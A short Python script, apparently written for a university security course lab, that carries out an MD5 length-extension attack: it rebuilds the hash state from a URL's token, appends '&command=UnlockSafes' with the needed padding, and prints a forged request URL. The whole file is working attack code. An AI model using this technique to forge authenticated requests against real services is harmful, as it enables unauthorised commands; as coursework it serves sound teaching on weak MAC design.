from pymd5 import md5, padding
from urllib.parse import urlparse
import sys, urllib.parse


#len attack implementation
org_url = sys.argv[1]

#ParseResult(scheme='https', netloc='project1.ecen4133.org', path='/identikey/lengthextension/api', params='', query='token=147f64391791f91525bac4dd7a2de503', fragment='command=SprinklersPowerOn')


org_url = org_url.replace('&', '#')
p_url = urlparse(org_url, allow_fragments=True)

token = p_url.query[6:]

commands = p_url.fragment

#new parsing method
# b4_token = org_url[:org_url.find("=")+1]
# token = org_url[org_url.find("=")+1 : org_url.find("&")]
# commands = org_url[org_url.find("&")+1:]
# print(org_url)
# print("before token:  " + b4_token)
# print("token:  " + token)
# print("commands:  " + commands)


cmd = bytes(commands, 'utf-8')
bits = (len(commands)+8 + len(padding((8+len(commands)) * 8))) * 8

h = md5(state=bytes.fromhex(token), count= bits)

x = "&command=UnlockSafes"

h.update(x)

new_hash = h.hexdigest()
padding = urllib.parse.quote(padding((len(commands)+8)*8))
message = commands + padding + x
url = p_url.scheme + "://" + p_url.netloc + p_url.path + "?token=" + new_hash + "&" + message
url = url.replace('#', '&')

print(url)